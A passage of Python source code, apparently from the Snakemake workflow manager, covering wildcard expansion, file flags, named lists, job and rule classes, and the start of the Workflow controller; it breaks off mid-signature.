    """ An alias for temp. """
    return temp(value)


def protected(value):
    """ A flag for a file that shall be write protected after creation. """
    if is_flagged(value, "temp"):
        raise SyntaxError(
            "Protected and temporary flags are mutually exclusive.")
    return flag(value, "protected")


def dynamic(value):
    """
    A flag for a file that shall be dynamic, i.e. the multiplicity
    (and wildcard values) will be expanded after a certain
    rule has been run """
    annotated = flag(value, "dynamic")                    
    tocheck = [annotated] if not_iterable(annotated) else annotated
    for file in tocheck:
        matches = list(_wildcard_regex.finditer(file))
        #if len(matches) != 1:
        #    raise SyntaxError("Dynamic files need exactly one wildcard.")
        for match in matches:
            if match.group("constraint"):
                raise SyntaxError(
                    "The wildcards in dynamic files cannot be constrained.")
    return annotated


def touch(value):
    return flag(value, "touch")


def expand(*args, **wildcards):
    """
    Expand wildcards in given filepatterns.

    Arguments
    *args -- first arg: filepatterns as list or one single filepattern,
        second arg (optional): a function to combine wildcard values
        (itertools.product per default)
    **wildcards -- the wildcards as keyword arguments
        with their values as lists
    """
    filepatterns = args[0]
    if len(args) == 1:
        combinator = product
    elif len(args) == 2:
        combinator = args[1]
    if isinstance(filepatterns, str):
        filepatterns = [filepatterns]

    def flatten(wildcards):
        for wildcard, values in wildcards.items():
            if isinstance(values, str) or not isinstance(values, Iterable):
                values = [values]
            yield [(wildcard, value) for value in values]

    try:
        return [filepattern.format(**comb)
                for comb in map(dict, combinator(*flatten(wildcards))) for
                filepattern in filepatterns]
    except KeyError as e:
        raise WildcardError("No values given for wildcard {}.".format(e))


def limit(pattern, **wildcards):
    """
    Limit wildcards to the given values.

    Arguments:
    **wildcards -- the wildcards as keyword arguments
                   with their values as lists
    """
    return pattern.format(**{
        wildcard: "{{{},{}}}".format(wildcard, "|".join(values))
        for wildcard, values in wildcards.items()
    })


def glob_wildcards(pattern):
    """
    Glob the values of the wildcards by matching the given pattern to the filesystem.
    Returns a named tuple with a list of values for each wildcard.
    """
    pattern = os.path.normpath(pattern)
    first_wildcard = re.search("{[^{]", pattern)
    dirname = os.path.dirname(pattern[:first_wildcard.start(
    )]) if first_wildcard else os.path.dirname(pattern)
    if not dirname:
        dirname = "."

    names = [match.group('name')
             for match in _wildcard_regex.finditer(pattern)]
    Wildcards = namedtuple("Wildcards", names)
    wildcards = Wildcards(*[list() for name in names])

    pattern = re.compile(regex(pattern))
    for dirpath, dirnames, filenames in os.walk(dirname):
        for f in chain(filenames, dirnames):
            if dirpath != ".":
                f = os.path.join(dirpath, f)
            match = re.match(pattern, f)
            if match:
                for name, value in match.groupdict().items():
                    getattr(wildcards, name).append(value)
    return wildcards


# TODO rewrite Namedlist!
class Namedlist(list):
    """
    A list that additionally provides functions to name items. Further,
    it is hashable, however the hash does not consider the item names.
    """

    def __init__(self, toclone=None, fromdict=None, plainstr=False):
        """
        Create the object.

        Arguments
        toclone  -- another Namedlist that shall be cloned
        fromdict -- a dict that shall be converted to a
            Namedlist (keys become names)
        """
        list.__init__(self)
        self._names = dict()

        if toclone:
            self.extend(map(str, toclone) if plainstr else toclone)
            if isinstance(toclone, Namedlist):
                self.take_names(toclone.get_names())
        if fromdict:
            for key, item in fromdict.items():
                self.append(item)
                self.add_name(key)

    def add_name(self, name):
        """
        Add a name to the last item.

        Arguments
        name -- a name
        """
        self.set_name(name, len(self) - 1)

    def set_name(self, name, index, end=None):
        """
        Set the name of an item.

        Arguments
        name  -- a name
        index -- the item index
        """
        self._names[name] = (index, end)
        if end is None:
            setattr(self, name, self[index])
        else:
            setattr(self, name, Namedlist(toclone=self[index:end]))

    def get_names(self):
        """
        Get the defined names as (name, index) pairs.
        """
        for name, index in self._names.items():
            yield name, index

    def take_names(self, names):
        """
        Take over the given names.

        Arguments
        names -- the given names as (name, index) pairs
        """
        for name, (i, j) in names:
            self.set_name(name, i, end=j)

    def items(self):
        for name in self._names:
            yield name, getattr(self, name)

    def allitems(self):
        next = 0
        for name, index in sorted(self._names.items(),
                                  key=lambda item: item[1][0]):
            start, end = index
            if end is None:
                end = start + 1
            if start > next:
                for item in self[next:start]:
                    yield None, item
            yield name, getattr(self, name)
            next = end
        for item in self[next:]:
            yield None, item

    def insert_items(self, index, items):
        self[index:index + 1] = items
        add = len(items) - 1
        for name, (i, j) in self._names.items():
            if i > index:
                self._names[name] = (i + add, j + add)
            elif i == index:
                self.set_name(name, i, end=i + len(items))

    def keys(self):
        return self._names

    def plainstrings(self):
        return self.__class__.__call__(toclone=self, plainstr=True)

    def __getitem__(self, key):
        try:
            return super().__getitem__(key)
        except TypeError:
            pass
        return getattr(self, key)

    def __hash__(self):
        return hash(tuple(self))

    def __str__(self):
        return " ".join(map(str, self))


class InputFiles(Namedlist):
    pass


class OutputFiles(Namedlist):
    pass


class Wildcards(Namedlist):
    pass


class Params(Namedlist):
    pass


class Resources(Namedlist):
    pass


class Log(Namedlist):
    pass


def _load_configfile(configpath):
    "Tries to load a configfile first as JSON, then as YAML, into a dict."
    try:
        with open(configpath) as f:
            try:
                return json.load(f)
            except ValueError:
                f.seek(0)  # try again
            try:
                import yaml
            except ImportError:
                raise WorkflowError("Config file is not valid JSON and PyYAML "
                                    "has not been installed. Please install "
                                    "PyYAML to use YAML config files.")
            try:
                return yaml.load(f)
            except yaml.YAMLError:
                raise WorkflowError("Config file is not valid JSON or YAML.")
    except FileNotFoundError:
        raise WorkflowError("Config file {} not found.".format(configpath))


def load_configfile(configpath):
    "Loads a JSON or YAML configfile as a dict, then checks that it's a dict."
    config = _load_configfile(configpath)
    if not isinstance(config, dict):
        raise WorkflowError("Config file must be given as JSON or YAML "
                            "with keys at top level.")
    return config

##### Wildcard pumping detection #####


class PeriodicityDetector:
    def __init__(self, min_repeat=50, max_repeat=100):
        """
        Args:
            max_len (int): The maximum length of the periodic substring.
        """
        self.regex = re.compile(
            "((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$".format(
                min_repeat=min_repeat - 1,
                max_repeat=max_repeat - 1))

    def is_periodic(self, value):
        """Returns the periodic substring or None if not periodic."""
        m = self.regex.search(value)  # search for a periodic suffix.
        if m is not None:
            return m.group("value")

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import sys
import base64
import json

from collections import defaultdict
from itertools import chain
from functools import partial
from operator import attrgetter

from snakemake.io import IOFile, Wildcards, Resources, _IOFile                    
from snakemake.utils import format, listfiles
from snakemake.exceptions import RuleException, ProtectedOutputException
from snakemake.exceptions import UnexpectedOutputException
from snakemake.logging import logger


def jobfiles(jobs, type):
    return chain(*map(attrgetter(type), jobs))


class Job:
    HIGHEST_PRIORITY = sys.maxsize

    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):
        self.rule = rule
        self.dag = dag
        self.targetfile = targetfile

        self.wildcards_dict = self.rule.get_wildcards(targetfile)
        self.wildcards = Wildcards(fromdict=self.wildcards_dict)
        self._format_wildcards = (self.wildcards if format_wildcards is None
                                  else Wildcards(fromdict=format_wildcards))

        (self.input, self.output, self.params, self.log, self.benchmark,
         self.ruleio,
         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)

        self.resources_dict = {
            name: min(self.rule.workflow.global_resources.get(name, res), res)
            for name, res in rule.resources.items()
        }
        self.threads = self.resources_dict["_cores"]
        self.resources = Resources(fromdict=self.resources_dict)
        self._inputsize = None

        self.dynamic_output, self.dynamic_input = set(), set()
        self.temp_output, self.protected_output = set(), set()
        self.touch_output = set()
        self.subworkflow_input = dict()
        for f in self.output:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_output:
                self.dynamic_output.add(f)
            if f_ in self.rule.temp_output:
                self.temp_output.add(f)
            if f_ in self.rule.protected_output:
                self.protected_output.add(f)
            if f_ in self.rule.touch_output:
                self.touch_output.add(f)
        for f in self.input:
            f_ = self.ruleio[f]
            if f_ in self.rule.dynamic_input:
                self.dynamic_input.add(f)
            if f_ in self.rule.subworkflow_input:
                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]
        self._hash = self.rule.__hash__()
        if True or not self.dynamic_output:
            for o in self.output:
                self._hash ^= o.__hash__()

    @property
    def priority(self):
        return self.dag.priority(self)

    @property
    def b64id(self):
        return base64.b64encode((self.rule.name + "".join(self.output)
                                 ).encode("utf-8")).decode("utf-8")

    @property
    def inputsize(self):
        """
        Return the size of the input files.
        Input files need to be present.
        """
        if self._inputsize is None:
            self._inputsize = sum(f.size for f in self.input)
        return self._inputsize

    @property
    def message(self):
        """ Return the message for this job. """
        try:
            return (self.format_wildcards(self.rule.message) if
                    self.rule.message else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable in message "
                                "of shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def shellcmd(self):
        """ Return the shell command. """
        try:
            return (self.format_wildcards(self.rule.shellcmd) if
                    self.rule.shellcmd else None)
        except AttributeError as ex:
            raise RuleException(str(ex), rule=self.rule)
        except KeyError as ex:
            raise RuleException("Unknown variable when printing "
                                "shell command: {}".format(str(ex)),
                                rule=self.rule)

    @property
    def expanded_output(self):
        """ Iterate over output files while dynamic output is expanded. """
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                expansion = self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill)
                if not expansion:
                    yield f_
                for f, _ in expansion:
                    yield IOFile(f, self.rule)                    
            else:
                yield f

    @property
    def dynamic_wildcards(self):
        """ Return all wildcard values determined from dynamic output. """
        combinations = set()
        for f, f_ in zip(self.output, self.rule.output):
            if f in self.dynamic_output:
                for f, w in self.expand_dynamic(
                    f_,
                    restriction=self.wildcards,
                    omit_value=_IOFile.dynamic_fill):
                    combinations.add(tuple(w.items()))
        wildcards = defaultdict(list)
        for combination in combinations:
            for name, value in combination:
                wildcards[name].append(value)
        return wildcards

    @property
    def missing_input(self):
        """ Return missing input files. """
        # omit file if it comes from a subworkflow
        return set(f for f in self.input
                   if not f.exists and not f in self.subworkflow_input)

    @property
    def output_mintime(self):
        """ Return oldest output file. """
        existing = [f.mtime for f in self.expanded_output if f.exists]
        if self.benchmark and self.benchmark.exists:
            existing.append(self.benchmark.mtime)
        if existing:
            return min(existing)
        return None

    @property
    def input_maxtime(self):
        """ Return newest input file. """
        existing = [f.mtime for f in self.input if f.exists]
        if existing:
            return max(existing)
        return None

    def missing_output(self, requested=None):
        """ Return missing output files. """
        files = set()
        if self.benchmark and (requested is None or
                               self.benchmark in requested):
            if not self.benchmark.exists:
                files.add(self.benchmark)

        for f, f_ in zip(self.output, self.rule.output):
            if requested is None or f in requested:
                if f in self.dynamic_output:
                    if not self.expand_dynamic(
                        f_,
                        restriction=self.wildcards,
                        omit_value=_IOFile.dynamic_fill):
                        files.add("{} (dynamic)".format(f_))
                elif not f.exists:
                    files.add(f)
        return files

    @property
    def existing_output(self):
        return filter(lambda f: f.exists, self.expanded_output)

    def check_protected_output(self):
        protected = list(filter(lambda f: f.protected, self.expanded_output))
        if protected:
            raise ProtectedOutputException(self.rule, protected)

    def prepare(self):
        """
        Prepare execution of job.
        This includes creation of directories and deletion of previously
        created dynamic files.
        """

        self.check_protected_output()

        unexpected_output = self.dag.reason(self).missing_output.intersection(
            self.existing_output)
        if unexpected_output:
            logger.warning(
                "Warning: the following output files of rule {} were not "
                "present when the DAG was created:\n{}".format(
                    self.rule, unexpected_output))

        if self.dynamic_output:
            for f, _ in chain(*map(partial(self.expand_dynamic,
                                           restriction=self.wildcards,
                                           omit_value=_IOFile.dynamic_fill),
                                   self.rule.dynamic_output)):
                os.remove(f)
        for f, f_ in zip(self.output, self.rule.output):
            f.prepare()
        for f in self.log:
            f.prepare()
        if self.benchmark:
            self.benchmark.prepare()

    def cleanup(self):
        """ Cleanup output files. """
        to_remove = [f for f in self.expanded_output if f.exists]
        if to_remove:
            logger.info("Removing output files of failed job {}"
                        " since they might be corrupted:\n{}".format(
                            self, ", ".join(to_remove)))
            for f in to_remove:
                f.remove()

    def format_wildcards(self, string, **variables):
        """ Format a string with variables from the job. """
        _variables = dict()
        _variables.update(self.rule.workflow.globals)
        _variables.update(dict(input=self.input,
                               output=self.output,
                               params=self.params,
                               wildcards=self._format_wildcards,
                               threads=self.threads,
                               resources=self.resources,
                               log=self.log,
                               version=self.rule.version,
                               rule=self.rule.name, ))
        _variables.update(variables)
        try:
            return format(string, **_variables)
        except NameError as ex:
            raise RuleException("NameError: " + str(ex), rule=self.rule)
        except IndexError as ex:
            raise RuleException("IndexError: " + str(ex), rule=self.rule)

    def properties(self, omit_resources="_cores _nodes".split()):
        resources = {
            name: res
            for name, res in self.resources.items()
            if name not in omit_resources
        }
        params = {name: value for name, value in self.params.items()}
        properties = {
            "rule": self.rule.name,
            "local": self.dag.workflow.is_local(self.rule),
            "input": self.input,
            "output": self.output,
            "params": params,
            "threads": self.threads,
            "resources": resources
        }
        return properties

    def json(self):
        return json.dumps(self.properties())

    def __repr__(self):
        return self.rule.name

    def __eq__(self, other):
        if other is None:
            return False
        return self.rule == other.rule and (
            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)

    def __lt__(self, other):
        return self.rule.__lt__(other.rule)

    def __gt__(self, other):
        return self.rule.__gt__(other.rule)

    def __hash__(self):
        return self._hash

    @staticmethod
    def expand_dynamic(pattern, restriction=None, omit_value=None):
        """ Expand dynamic files. """
        return list(listfiles(pattern,
                              restriction=restriction,
                              omit_value=omit_value))


class Reason:
    def __init__(self):
        self.updated_input = set()
        self.updated_input_run = set()
        self.missing_output = set()
        self.incomplete_output = set()
        self.forced = False
        self.noio = False
        self.nooutput = False
        self.derived = True

    def __str__(self):
        s = list()
        if self.forced:
            s.append("Forced execution")
        else:
            if self.noio:
                s.append("Rules with neither input nor "
                         "output files are always executed.")
            elif self.nooutput:
                s.append("Rules with a run or shell declaration but no output "
                         "are always executed.")
            else:
                if self.missing_output:
                    s.append("Missing output files: {}".format(
                        ", ".join(self.missing_output)))
                if self.incomplete_output:
                    s.append("Incomplete output files: {}".format(
                        ", ".join(self.incomplete_output)))
                updated_input = self.updated_input - self.updated_input_run
                if updated_input:
                    s.append("Updated input files: {}".format(
                        ", ".join(updated_input)))
                if self.updated_input_run:
                    s.append("Input files updated by another job: {}".format(
                        ", ".join(self.updated_input_run)))
        s = "; ".join(s)
        return s

    def __bool__(self):
        return bool(self.updated_input or self.missing_output or self.forced or
                    self.updated_input_run or self.noio or self.nooutput)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import sys
import inspect
import sre_constants
from collections import defaultdict

from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist
from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log
from snakemake.io import apply_wildcards, is_flagged, not_iterable
from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException


class Rule:
    def __init__(self, *args, lineno=None, snakefile=None):
        """
        Create a rule

        Arguments
        name -- the name of the rule
        """
        if len(args) == 2:
            name, workflow = args
            self.name = name
            self.workflow = workflow
            self.docstring = None
            self.message = None
            self._input = InputFiles()
            self._output = OutputFiles()
            self._params = Params()
            self.dependencies = dict()
            self.dynamic_output = set()
            self.dynamic_input = set()
            self.temp_output = set()
            self.protected_output = set()
            self.touch_output = set()
            self.subworkflow_input = dict()
            self.resources = dict(_cores=1, _nodes=1)
            self.priority = 0
            self.version = None
            self._log = Log()
            self._benchmark = None
            self.wildcard_names = set()
            self.lineno = lineno
            self.snakefile = snakefile
            self.run_func = None
            self.shellcmd = None
            self.norun = False
        elif len(args) == 1:
            other = args[0]
            self.name = other.name
            self.workflow = other.workflow
            self.docstring = other.docstring
            self.message = other.message
            self._input = InputFiles(other._input)
            self._output = OutputFiles(other._output)
            self._params = Params(other._params)
            self.dependencies = dict(other.dependencies)
            self.dynamic_output = set(other.dynamic_output)
            self.dynamic_input = set(other.dynamic_input)
            self.temp_output = set(other.temp_output)
            self.protected_output = set(other.protected_output)
            self.touch_output = set(other.touch_output)
            self.subworkflow_input = dict(other.subworkflow_input)
            self.resources = other.resources
            self.priority = other.priority
            self.version = other.version
            self._log = other._log
            self._benchmark = other._benchmark
            self.wildcard_names = set(other.wildcard_names)
            self.lineno = other.lineno
            self.snakefile = other.snakefile
            self.run_func = other.run_func
            self.shellcmd = other.shellcmd
            self.norun = other.norun

    def dynamic_branch(self, wildcards, input=True):
        def get_io(rule):
            return (rule.input, rule.dynamic_input) if input else (
                rule.output, rule.dynamic_output
            )

        io, dynamic_io = get_io(self)

        branch = Rule(self)
        io_, dynamic_io_ = get_io(branch)

        expansion = defaultdict(list)
        for i, f in enumerate(io):
            if f in dynamic_io:
                try:
                    for e in reversed(expand(f, zip, **wildcards)):
                        expansion[i].append(IOFile(e, rule=branch))                    
                except KeyError:
                    return None

        # replace the dynamic files with the expanded files
        replacements = [(i, io[i], e)
                        for i, e in reversed(list(expansion.items()))]
        for i, old, exp in replacements:
            dynamic_io_.remove(old)
            io_.insert_items(i, exp)

        if not input:
            for i, old, exp in replacements:
                if old in branch.temp_output:
                    branch.temp_output.discard(old)
                    branch.temp_output.update(exp)
                if old in branch.protected_output:
                    branch.protected_output.discard(old)
                    branch.protected_output.update(exp)
                if old in branch.touch_output:
                    branch.touch_output.discard(old)
                    branch.touch_output.update(exp)

            branch.wildcard_names.clear()
            non_dynamic_wildcards = dict((name, values[0])
                                         for name, values in wildcards.items()
                                         if len(set(values)) == 1)
            # TODO have a look into how to concretize dependencies here
            (branch._input, branch._output, branch._params, branch._log,
             branch._benchmark, _, branch.dependencies
             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)
            return branch, non_dynamic_wildcards
        return branch

    def has_wildcards(self):
        """
        Return True if rule contains wildcards.
        """
        return bool(self.wildcard_names)

    @property
    def benchmark(self):
        return self._benchmark

    @benchmark.setter
    def benchmark(self, benchmark):
        self._benchmark = IOFile(benchmark, rule=self)

    @property
    def input(self):
        return self._input

    def set_input(self, *input, **kwinput):
        """
        Add a list of input files. Recursive lists are flattened.

        Arguments
        input -- the list of input files
        """
        for item in input:
            self._set_inoutput_item(item)
        for name, item in kwinput.items():
            self._set_inoutput_item(item, name=name)

    @property
    def output(self):
        return self._output

    @property
    def products(self):
        products = list(self.output)
        if self.benchmark:
            products.append(self.benchmark)
        return products

    def set_output(self, *output, **kwoutput):
        """
        Add a list of output files. Recursive lists are flattened.

        Arguments
        output -- the list of output files
        """
        for item in output:
            self._set_inoutput_item(item, output=True)
        for name, item in kwoutput.items():
            self._set_inoutput_item(item, output=True, name=name)

        for item in self.output:
            if self.dynamic_output and item not in self.dynamic_output:
                raise SyntaxError(
                    "A rule with dynamic output may not define any "
                    "non-dynamic output files.")
            wildcards = item.get_wildcard_names()
            if self.wildcard_names:
                if self.wildcard_names != wildcards:
                    raise SyntaxError(
                        "Not all output files of rule {} "
                        "contain the same wildcards.".format(self.name))
            else:
                self.wildcard_names = wildcards

    def _set_inoutput_item(self, item, output=False, name=None):
        """
        Set an item to be input or output.

        Arguments
        item     -- the item
        inoutput -- either a Namedlist of input or output items
        name     -- an optional name for the item
        """
        inoutput = self.output if output else self.input
        if isinstance(item, str):
            # add the rule to the dependencies
            if isinstance(item, _IOFile):
                self.dependencies[item] = item.rule
            _item = IOFile(item, rule=self)
            if is_flagged(item, "temp"):
                if not output:
                    raise SyntaxError("Only output files may be temporary")
                self.temp_output.add(_item)
            if is_flagged(item, "protected"):
                if not output:
                    raise SyntaxError("Only output files may be protected")
                self.protected_output.add(_item)
            if is_flagged(item, "touch"):
                if not output:
                    raise SyntaxError(
                        "Only output files may be marked for touching.")
                self.touch_output.add(_item)
            if is_flagged(item, "dynamic"):
                if output:
                    self.dynamic_output.add(_item)
                else:
                    self.dynamic_input.add(_item)
            if is_flagged(item, "subworkflow"):
                if output:
                    raise SyntaxError(
                        "Only input files may refer to a subworkflow")
                else:
                    # record the workflow this item comes from
                    self.subworkflow_input[_item] = item.flags["subworkflow"]
            inoutput.append(_item)
            if name:
                inoutput.add_name(name)
        elif callable(item):
            if output:
                raise SyntaxError(
                    "Only input files can be specified as functions")
            inoutput.append(item)
            if name:
                inoutput.add_name(name)
        else:
            try:
                start = len(inoutput)
                for i in item:
                    self._set_inoutput_item(i, output=output)
                if name:
                    # if the list was named, make it accessible
                    inoutput.set_name(name, start, end=len(inoutput))
            except TypeError:
                raise SyntaxError(
                    "Input and output files have to be specified as strings or lists of strings.")

    @property
    def params(self):
        return self._params

    def set_params(self, *params, **kwparams):
        for item in params:
            self._set_params_item(item)
        for name, item in kwparams.items():
            self._set_params_item(item, name=name)

    def _set_params_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.params.append(item)
            if name:
                self.params.add_name(name)
        else:
            try:
                start = len(self.params)
                for i in item:
                    self._set_params_item(i)
                if name:
                    self.params.set_name(name, start, end=len(self.params))
            except TypeError:
                raise SyntaxError("Params have to be specified as strings.")

    @property
    def log(self):
        return self._log

    def set_log(self, *logs, **kwlogs):
        for item in logs:
            self._set_log_item(item)
        for name, item in kwlogs.items():
            self._set_log_item(item, name=name)

    def _set_log_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.log.append(IOFile(item,
                                   rule=self)
                            if isinstance(item, str) else item)
            if name:
                self.log.add_name(name)
        else:
            try:
                start = len(self.log)
                for i in item:
                    self._set_log_item(i)
                if name:
                    self.log.set_name(name, start, end=len(self.log))
            except TypeError:
                raise SyntaxError("Log files have to be specified as strings.")

    def expand_wildcards(self, wildcards=None):
        """
        Expand wildcards depending on the requested output
        or given wildcards dict.
        """

        def concretize_iofile(f, wildcards):
            if not isinstance(f, _IOFile):
                return IOFile(f, rule=self)
            else:
                return f.apply_wildcards(wildcards,
                                         fill_missing=f in self.dynamic_input,
                                         fail_dynamic=self.dynamic_output)

        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,
                             concretize=apply_wildcards,
                             ruleio=None):
            for name, item in olditems.allitems():
                start = len(newitems)
                is_iterable = True
                if callable(item):
                    try:
                        item = item(wildcards_obj)
                    except (Exception, BaseException) as e:
                        raise InputFunctionException(e, rule=self)
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        if not isinstance(item_, str):
                            raise RuleException(
                                "Input function did not return str or list of str.",
                                rule=self)
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                else:
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                if name:
                    newitems.set_name(
                        name, start,
                        end=len(newitems) if is_iterable else None)

        if wildcards is None:
            wildcards = dict()
        missing_wildcards = self.wildcard_names - set(wildcards.keys())

        if missing_wildcards:
            raise RuleException(
                "Could not resolve wildcards in rule {}:\n{}".format(
                    self.name, "\n".join(self.wildcard_names)),
                lineno=self.lineno,
                snakefile=self.snakefile)

        ruleio = dict()

        try:
            input = InputFiles()
            wildcards_obj = Wildcards(fromdict=wildcards)
            _apply_wildcards(input, self.input, wildcards, wildcards_obj,
                             concretize=concretize_iofile,
                             ruleio=ruleio)

            params = Params()
            _apply_wildcards(params, self.params, wildcards, wildcards_obj)

            output = OutputFiles(o.apply_wildcards(wildcards)
                                 for o in self.output)
            output.take_names(self.output.get_names())

            dependencies = {
                None if f is None else f.apply_wildcards(wildcards): rule
                for f, rule in self.dependencies.items()
            }

            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))

            log = Log()
            _apply_wildcards(log, self.log, wildcards, wildcards_obj,
                             concretize=concretize_iofile)

            benchmark = self.benchmark.apply_wildcards(
                wildcards) if self.benchmark else None
            return input, output, params, log, benchmark, ruleio, dependencies
        except WildcardError as ex:
            # this can only happen if an input contains an unresolved wildcard.
            raise RuleException(
                "Wildcards in input, params, log or benchmark file of rule {} cannot be "
                "determined from output files:\n{}".format(self, str(ex)),
                lineno=self.lineno,
                snakefile=self.snakefile)

    def is_producer(self, requested_output):
        """
        Returns True if this rule is a producer of the requested output.
        """
        try:
            for o in self.products:
                if o.match(requested_output):
                    return True
            return False
        except sre_constants.error as ex:
            raise IOFileException("{} in wildcard statement".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)
        except ValueError as ex:
            raise IOFileException("{}".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)

    def get_wildcards(self, requested_output):
        """
        Update the given wildcard dictionary by matching regular expression
        output files to the requested concrete ones.

        Arguments
        wildcards -- a dictionary of wildcards
        requested_output -- a concrete filepath
        """
        if requested_output is None:
            return dict()
        bestmatchlen = 0
        bestmatch = None

        for o in self.products:
            match = o.match(requested_output)
            if match:
                l = self.get_wildcard_len(match.groupdict())
                if not bestmatch or bestmatchlen > l:
                    bestmatch = match.groupdict()
                    bestmatchlen = l
        return bestmatch

    @staticmethod
    def get_wildcard_len(wildcards):
        """
        Return the length of the given wildcard values.

        Arguments
        wildcards -- a dict of wildcards
        """
        return sum(map(len, wildcards.values()))

    def __lt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp < 0

    def __gt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp > 0

    def __str__(self):
        return self.name

    def __hash__(self):
        return self.name.__hash__()

    def __eq__(self, other):
        return self.name == other.name


class Ruleorder:
    def __init__(self):
        self.order = list()

    def add(self, *rulenames):
        """
        Records the order of given rules as rule1 > rule2 > rule3, ...
        """
        self.order.append(list(rulenames))

    def compare(self, rule1, rule2):
        """
        Return whether rule2 has a higher priority than rule1.
        """
        # try the last clause first,
        # i.e. clauses added later overwrite those before.
        for clause in reversed(self.order):
            try:
                i = clause.index(rule1.name)
                j = clause.index(rule2.name)
                # rules with higher priority should have a smaller index
                comp = j - i
                if comp < 0:
                    comp = -1
                elif comp > 0:
                    comp = 1
                return comp
            except ValueError:
                pass

        # if not ruleorder given, prefer rule without wildcards
        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()
        if wildcard_cmp != 0:
            return wildcard_cmp

        return 0

    def __iter__(self):
        return self.order.__iter__()

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import re
import os
import sys
import signal
import json
import urllib
from collections import OrderedDict
from itertools import filterfalse, chain
from functools import partial
from operator import attrgetter

from snakemake.logging import logger, format_resources, format_resource_names
from snakemake.rules import Rule, Ruleorder
from snakemake.exceptions import RuleException, CreateRuleException, \
    UnknownRuleException, NoRulesException, print_exception, WorkflowError
from snakemake.shell import shell
from snakemake.dag import DAG
from snakemake.scheduler import JobScheduler
from snakemake.parser import parse
import snakemake.io
from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch                    
from snakemake.persistence import Persistence
from snakemake.utils import update_config


class Workflow:
    def __init__(self,
                 snakefile=None,
                 snakemakepath=None,
                 jobscript=None,
                 overwrite_shellcmd=None,
                 overwrite_config=dict(),
                 overwrite_workdir=None,
                 overwrite_configfile=None,
                 config_args=None,
                 debug=False):
        """
        Create the controller.
        """
        self._rules = OrderedDict()
        self.first_rule = None
        self._workdir = None
        self.overwrite_workdir = overwrite_workdir
        self.workdir_init = os.path.abspath(os.curdir)
        self._ruleorder = Ruleorder()
        self._localrules = set()
        self.linemaps = dict()
        self.rule_count = 0
        self.basedir = os.path.dirname(snakefile)
        self.snakefile = os.path.abspath(snakefile)
        self.snakemakepath = snakemakepath
        self.included = []
        self.included_stack = []
        self.jobscript = jobscript
        self.persistence = None
        self.global_resources = None
        self.globals = globals()
        self._subworkflows = dict()
        self.overwrite_shellcmd = overwrite_shellcmd
        self.overwrite_config = overwrite_config
        self.overwrite_configfile = overwrite_configfile
        self.config_args = config_args
        self._onsuccess = lambda log: None
        self._onerror = lambda log: None
        self.debug = debug

        global config
        config = dict()
        config.update(self.overwrite_config)

        global rules
        rules = Rules()

    @property
    def subworkflows(self):
        return self._subworkflows.values()

    @property
    def rules(self):
        return self._rules.values()

    @property
    def concrete_files(self):
        return (
            file
            for rule in self.rules for file in chain(rule.input, rule.output)
            if not callable(file) and not file.contains_wildcard()
        )

    def check(self):
        for clause in self._ruleorder:
            for rulename in clause:
                if not self.is_rule(rulename):
                    raise UnknownRuleException(
                        rulename,
                        prefix="Error in ruleorder definition.")

    def add_rule(self, name=None, lineno=None, snakefile=None):
        """
        Add a rule.
        """
        if name is None:
            name = str(len(self._rules) + 1)
        if self.is_rule(name):
            raise CreateRuleException(
                "The name {} is already used by another rule".format(name))
        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)
        self._rules[rule.name] = rule
        self.rule_count += 1
        if not self.first_rule:
            self.first_rule = rule.name
        return name

    def is_rule(self, name):
        """
        Return True if name is the name of a rule.

        Arguments
        name -- a name
        """
        return name in self._rules

    def get_rule(self, name):
        """
        Get rule by name.

        Arguments
        name -- the name of the rule
        """
        if not self._rules:
            raise NoRulesException()
        if not name in self._rules:
            raise UnknownRuleException(name)
        return self._rules[name]

    def list_rules(self, only_targets=False):
        rules = self.rules
        if only_targets:
            rules = filterfalse(Rule.has_wildcards, rules)
        for rule in rules:
            logger.rule_info(name=rule.name, docstring=rule.docstring)

    def list_resources(self):
        for resource in set(
            resource for rule in self.rules for resource in rule.resources):
            if resource not in "_cores _nodes".split():
                logger.info(resource)

    def is_local(self, rule):
        return rule.name in self._localrules or rule.norun

    def execute(self,
                targets=None,
                dryrun=False,
                touch=False,
                cores=1,
                nodes=1,
                local_cores=1,
                forcetargets=False,
                forceall=False,
                forcerun=None,
